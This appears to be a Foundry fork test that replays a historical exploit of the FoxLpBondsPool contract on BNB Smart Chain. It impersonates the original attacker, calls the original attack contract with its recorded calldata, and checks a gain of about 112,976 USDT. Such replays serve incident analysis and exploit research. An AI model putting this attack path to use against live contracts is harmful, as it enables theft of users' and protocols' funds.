// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {TestBase, Vm} from "./TestBase.sol";

interface IERC20Balance {
    function balanceOf(address) external view returns (uint256);
}

// NO STORAGE OVERRIDE: exact original EOA, attack contract and calldata at block-1.
contract FoxLpBondsPoolForkTest is TestBase {
    address internal constant CALLER = 0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9;
    address internal constant ATTACK = 0x3A82A2A77061017927e5331fFFd07c0308a1D2DA;
    address internal constant POOL = 0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0;
    address internal constant PAIR = 0xAAb18bCDEe287AEA288c0560612cAadf7c328803;
    IERC20Balance internal constant USDT = IERC20Balance(0x55d398326f99059fF775485246999027B3197955);
    IERC20Balance internal constant FOX = IERC20Balance(0xdF81d50c6657487D19B66A1b5375E35A804Abb93);
    bytes internal constant ORIGINAL_CALLDATA = hex"7f14cf110000000000000000000000009fa6d8a13b35e051bfc145918db0111dec13d1a0";

    function setUp() public {
        vm.createSelectFork(vm.envString("BSC_ARCHIVE_RPC"), 116169048);
        vm.label(CALLER, "Original caller EOA");
        vm.label(ATTACK, "Original attack contract");
        vm.label(POOL, "FoxLpBondsPool proxy");
        vm.label(PAIR, "FOX/USDT victim pair");
    }

    function test_original_calldata_positive_withdrawal() public {
        uint256 before = USDT.balanceOf(ATTACK);
        vm.prank(CALLER, CALLER);
        (bool ok,) = ATTACK.call(ORIGINAL_CALLDATA);
        require(ok, "original exploit call reverted");
        uint256 gain = USDT.balanceOf(ATTACK) - before;
        // Trace-derived target; archive replay must remain within 5 USDT.
        assertApproxEqAbs(gain, 112_976 ether, 5 ether, "unexpected USDT gain");
        assertGt(gain, 0, "no positive withdrawal");
    }
}
